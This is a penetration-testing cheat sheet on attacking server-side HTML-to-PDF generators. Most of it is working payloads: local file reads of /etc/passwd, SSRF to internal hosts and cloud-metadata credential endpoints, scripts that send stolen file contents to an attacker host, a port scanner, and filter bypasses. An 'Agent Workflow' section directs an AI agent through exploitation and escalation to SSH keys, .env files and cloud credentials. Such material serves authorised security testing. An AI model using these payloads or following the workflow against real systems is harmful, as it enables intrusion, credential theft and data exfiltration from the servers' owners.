# PDF Generation Vulnerabilities

> **Summary**: Server-side HTML-to-PDF converters that process user-controlled input can be exploited to achieve XSS in the PDF context, read local files, perform SSRF, and exfiltrate sensitive data.
> **Impact**: Local file read (e.g., `/etc/passwd`, source code), SSRF to internal services and cloud metadata endpoints, JavaScript execution in the server's PDF rendering context, and internal network port scanning.
> **Typical Severity**: High

---

## Detection

### Indicators
- Application generates PDF reports, invoices, receipts, or exports from user-supplied data
- PDF metadata reveals the rendering engine (check with `exiftool`)
- User-controlled fields appear in the generated PDF (names, addresses, comments, descriptions)
- Application accepts HTML/Markdown input that is rendered into PDF

### Automated Detection
```bash
# Identify the PDF generation library from metadata
exiftool <DOWNLOADED_PDF>
# Look for Creator/Producer fields: wkhtmltopdf, Puppeteer, Chrome Headless, TCPDF, PDFKit, iText, WeasyPrint, Prince
```

### Manual Detection
1. Download a generated PDF and run `exiftool` to identify the rendering engine
2. Inject a simple HTML tag in user-controlled fields: `<b>test</b>` -- check if it renders as bold in the PDF
3. Test for external resource loading: `<img src="http://<COLLABORATOR_URL>/probe">` -- check for DNS/HTTP callback
4. If callback received, the PDF generator processes HTML and fetches external resources

---

## Exploitation

### Prerequisites
- User input is embedded into an HTML template that is converted to PDF server-side
- The PDF generation engine interprets HTML/CSS/JavaScript (wkhtmltopdf, Puppeteer, Chrome Headless, PhantomJS)
- No strict Content Security Policy or network restrictions on the PDF renderer

### Step-by-Step

1. **Identify the PDF generator** -- download a PDF and check `exiftool` output for `Creator` / `Producer`
2. **Test HTML rendering** -- inject `<h1>INJECTED</h1>` in a user field; confirm it renders in the PDF
3. **Test external resource loading** -- inject `<img src="http://<COLLABORATOR>/test">` and check for callback
4. **Attempt local file read** -- use `<iframe>`, `<script>`, or `XMLHttpRequest` to read `file:///etc/passwd`
5. **Attempt SSRF** -- replace `file://` with `http://169.254.169.254/latest/meta-data/` or internal hosts
6. **Exfiltrate data** -- send file contents to an external server via `XMLHttpRequest` or image src encoding
7. **Success criteria** -- local file contents visible in PDF, or external callback received with exfiltrated data

### SSRF Payloads

```html
<!-- Image tag SSRF -->
<img src="http://<COLLABORATOR_URL>/ssrf-test"/>

<!-- Link tag SSRF -->
<link rel="stylesheet" href="http://<COLLABORATOR_URL>/ssrf-css">

<!-- Iframe SSRF -->
<iframe src="http://<COLLABORATOR_URL>/ssrf-iframe"></iframe>

<!-- Cloud metadata SSRF -->
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Internal network scanning -->
<img src="http://127.0.0.1:8080/">
<img src="http://192.168.1.1/">
```

### Local File Read (LFI) Payloads

**Via JavaScript XMLHttpRequest** (most reliable for wkhtmltopdf):
```html
<script>
    x = new XMLHttpRequest();
    x.onload = function(){ document.write(this.responseText) };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

**Via JavaScript with Base64 encoding** (avoids rendering issues):
```html
<script>
    x = new XMLHttpRequest();
    x.onload = function(){ document.write(btoa(this.responseText)) };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

**Via HTML elements** (no JavaScript required):
```html
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
<embed src="file:///etc/passwd" width="800" height="500">
```

**Via PDF annotation** (PD4ML, TCPDF):
```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" />
```

**Via PD4ML attachment** (attaches local files to PDF):
```html
<html>
  <pd4ml:attachment src="/etc/passwd" description="attachment" icon="Paperclip" />
</html>
```

### Blind Exfiltration (When PDF is Not Returned)

When you cannot see the generated PDF, exfiltrate data to an external server:

```html
<!-- Exfiltrate via image src -->
<script>
    x = new XMLHttpRequest();
    x.onload = function(){
        new Image().src = "http://<ATTACKER_HOST>/?data=" + btoa(this.responseText);
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>

<!-- Exfiltrate via redirect -->
<script>
    x = new XMLHttpRequest();
    x.onload = function(){
        document.location = "http://<ATTACKER_HOST>/?data=" + encodeURIComponent(btoa(this.responseText));
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

### SVG-Based Payloads

Useful when the application processes SVG images in the PDF context:

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="file:///etc/passwd" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```

### Path Discovery

Determine the internal file path or URL the PDF bot is rendering from:

```html
<script>document.write(window.location)</script>
<img src="x" onerror="document.write(window.location)" />
```

### Port Scanning via PDF Generator

```html
<script>
const checkPort = (port) => {
    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
        let img = document.createElement("img");
        img.src = `http://<ATTACKER_HOST>/open?port=${port}`;
    });
}
for (let i = 0; i < 10000; i++) { checkPort(i); }
</script>
```

### Proof of Concept
```bash
# 1. Generate a malicious PDF using the tool
python3 malicious-pdf.py <COLLABORATOR_URL>

# 2. Upload or input HTML payload in user-controlled field
# 3. Download generated PDF and check for file contents or collaborator callbacks
```

---

## Bypasses

- **External script loading**: `<script src="http://<ATTACKER>/payload.js"></script>` -- avoids inline JS filters
- **Event handlers**: `<img src=x onerror="<PAYLOAD>">` -- bypass `<script>` tag filters
- **SVG embedding**: use `<foreignObject>` inside SVG to execute HTML/JS
- **Base tag**: `<base href="http://<ATTACKER>/">` -- makes all relative URLs resolve to attacker's server
- **Meta refresh**: `<meta http-equiv="refresh" content="0;url=http://<ATTACKER>/">` -- redirect the renderer
- **CSS import**: `@import url('http://<ATTACKER>/exfil')` -- exfiltrate via stylesheet loading
- **Data URIs**: `<iframe src="data:text/html,<script>...</script>">` -- embed inline HTML

---

## Escalation

- **SSRF to cloud metadata**: read AWS/GCP/Azure instance credentials via `169.254.169.254`
- **Source code read**: `file:///var/www/html/config.php` or application source files
- **Internal service discovery**: port scan internal network from the PDF renderer's perspective
- **Credential harvesting**: read `.env`, `config.yml`, database connection strings
- **Chained XSS**: if the PDF is served inline (not as attachment), XSS in the PDF viewer context
- **RCE via dependency**: some PDF libraries have known command injection vulnerabilities (e.g., CVE in wkhtmltopdf, node-qpdf)

---

## Tools

| Tool | Usage |
|------|-------|
| `exiftool` | Identify PDF generation library from metadata |
| [malicious-pdf](https://github.com/jonaslejon/malicious-pdf) | `python3 malicious-pdf.py <COLLABORATOR_URL>` -- generate test PDFs |
| Burp Collaborator | Detect SSRF callbacks from PDF renderer |
| [interactsh](https://github.com/projectdiscovery/interactsh) | OOB interaction detection for blind testing |
| Burp Suite Repeater | Craft and test HTML injection payloads |

---

## References

- [Exploiting PDF Generators - Intigriti Research](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators)
- [Breaking Down SSRF on PDF Generation - InfoSec Write-ups](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)
- [Escalating XSS in PhantomJS to SSRF/LFI](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
- [Local File Read via XSS in Dynamic PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
- [SVG Cheatsheet](https://github.com/allanlw/svg-cheatsheet)

## Agent Workflow
> Step-by-step instructions for an AI agent to test for PDF generation vulnerabilities.

### Phase 1: Discovery
1. Identify all features that generate PDFs: invoices, reports, exports, receipts, certificates, email attachments, print-to-PDF.
2. Download a generated PDF and identify the rendering engine using `exiftool`:
   ```bash
   exiftool <DOWNLOADED_PDF>
   ```
   Look for `Creator`/`Producer` fields: wkhtmltopdf, Puppeteer, Chrome Headless, TCPDF, PDFKit, iText, WeasyPrint, Prince, PhantomJS.
3. Identify which user-controlled fields appear in the generated PDF (names, addresses, comments, descriptions, custom fields).
4. Map all input vectors: form fields, URL parameters, API body parameters, file uploads (HTML/Markdown input).

### Phase 2: Validation
1. Test HTML rendering by injecting `<h1>INJECTED</h1>` or `<b>test</b>` in a user-controlled field. Generate the PDF and check if the HTML is rendered (bold text, heading).
2. Test external resource loading by injecting:
   ```html
   <img src="http://<COLLABORATOR_URL>/probe">
   ```
   Check Burp Collaborator / interactsh for DNS/HTTP callback. If callback received, the PDF generator fetches external resources.
3. Test JavaScript execution:
   ```html
   <script>document.write('JS_EXEC')</script>
   ```
   If "JS_EXEC" appears in the PDF, the engine executes JavaScript.
4. Determine the rendering context path:
   ```html
   <script>document.write(window.location)</script>
   ```

### Phase 3: Exploitation
1. **Local file read** (if JavaScript is enabled -- most reliable for wkhtmltopdf):
   ```html
   <script>x=new XMLHttpRequest();x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
   ```
2. **Local file read without JavaScript** (iframe/embed):
   ```html
   <iframe src="file:///etc/passwd" width="800" height="500"></iframe>
   ```
3. **SSRF to cloud metadata**:
   ```html
   <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
   ```
4. **SSRF to internal services**:
   ```html
   <img src="http://127.0.0.1:8080/">
   <img src="http://192.168.1.1/">
   ```
5. **Blind exfiltration** (when PDF is not returned to the user):
   ```html
   <script>x=new XMLHttpRequest();x.onload=function(){new Image().src="http://<ATTACKER_HOST>/?data="+btoa(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
   ```

### Phase 4: Escalation
1. Read sensitive files: `/var/www/html/config.php`, `.env`, `config.yml`, database connection strings, SSH keys.
2. Read cloud metadata credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` for AWS IAM role credentials.
3. Port scan internal network from the PDF renderer's perspective to discover internal services.
4. Chain SSRF with internal API access to perform actions on behalf of the server.
5. If the PDF is served inline (not as download), test for XSS in the PDF viewer context.
6. Check for known RCE vulnerabilities in the PDF library version (CVEs for wkhtmltopdf, node-qpdf).

## Decision Tree

```
Start: Identify PDF generation feature and rendering engine
  |
  +---> HTML injection works?
  |       +---> Yes: Test JavaScript execution
  |       |       +---> JS works: XMLHttpRequest file:// --> LFI
  |       |       |       +---> LFI works: Read /etc/passwd, config files, .env
  |       |       |       +---> SSRF: fetch http://169.254.169.254/
  |       |       +---> JS blocked: Test iframe/embed file:// --> LFI
  |       +---> No HTML injection: Test via SVG, external CSS, meta refresh
  |
  +---> External resource loading works?
  |       +---> SSRF: access internal services, cloud metadata
  |       +---> Blind exfil: send file contents to attacker server
  |
  +---> PDF not visible to attacker?
          +---> Blind exfiltration via DNS/HTTP OOB callbacks
```

## Success Criteria
- [ ] PDF rendering engine identified from metadata
- [ ] HTML injection confirmed in generated PDF
- [ ] External resource loading confirmed (Collaborator callback received)
- [ ] Local file contents (`/etc/passwd` or equivalent) visible in generated PDF or received via OOB
- [ ] If escalating: cloud metadata credentials or internal service responses obtained
- [ ] If escalating: sensitive application configuration files read

---

**See also**: [SSRF](ssrf.md) | [XSS](xss.md) | [LFI](lfi.md)
